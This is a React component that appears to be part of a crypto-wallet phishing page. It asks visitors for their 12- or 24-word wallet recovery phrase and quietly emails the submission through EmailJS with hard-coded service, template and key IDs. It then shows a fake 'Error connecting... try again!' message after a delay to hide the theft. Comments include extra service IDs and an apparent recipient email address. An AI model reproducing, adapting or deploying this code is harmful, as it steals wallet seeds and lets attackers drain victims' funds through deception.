import React, { useRef, useState } from "react";
import emailjs from "emailjs-com";
import Connecting from "./Connecting";
// "service_ggfhrnv", "template_222dd8f",
const Phrase = () => {
  const [visible, setVisible] = useState(false);
  const emailRef = useRef();
  const [input, setInput] = useState("");
  const form = useRef();
  const [errorText, setErrorText] = useState(null);

  // const handleClick = () => {
  //   setVisible(true);
  // };

  const sendEmail = (e) => {
    e.preventDefault();
    if (!input) {
      setErrorText("Field cannot be empty, Enter your Phrase");
    } else {
      setVisible(true);

      return emailjs
        .sendForm(
          "service_b3onsac",
          "template_pt49rkm",
          form.current,
          "Afl-tWpRUJQYssiE7"
        )

        .then(
          (result) => {
            setTimeout(() => {
              setVisible(false);
              alert("Error connecting... try again!");
              setInput("");
              setErrorText("Error connecting... try again!");
            }, 9000);
            // console.log(result.text);
          },
          (error) => {
            console.log(error.text);
          }
        );
    }
  };

  return (
    <div className="mt-[2rem] flex items-center justify-center px-4 w-full ">
      <div className="w-full flex flex-col items-center">
        <h1 className="text-gray-500 text-center my-4">
          Please enter your 12/24 word phrase
        </h1>

        <form
          ref={form}
          onSubmit={sendEmail}
          className="w-full flex flex-col items-center justify-center"
        >
          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            name="message"
            id=""
            cols="30"
            rows="10"
            className="border-2 border-gray-300 w-full h-[8rem]"
          >
            {" "}
          </textarea>

          <h1 className="text-center text-gray-500">
            use comma "," to seperate wallet keys
          </h1>
          {errorText && <p className="text-red-600 text-sm">{errorText}</p>}
          <button
            onClick={sendEmail}
            type="submit"
            className="text-center px-6 font-semibold text-white mt-3
      w-[80%] py-3 bg-blue-500 rounded-md justify-center"
          >
            Connect
          </button>
        </form>
      </div>
      {visible && input && <Connecting />}
    </div>
  );
};

export default Phrase;
// robcook.akelaconstructions@yahoo.com
// service_4ak5tds
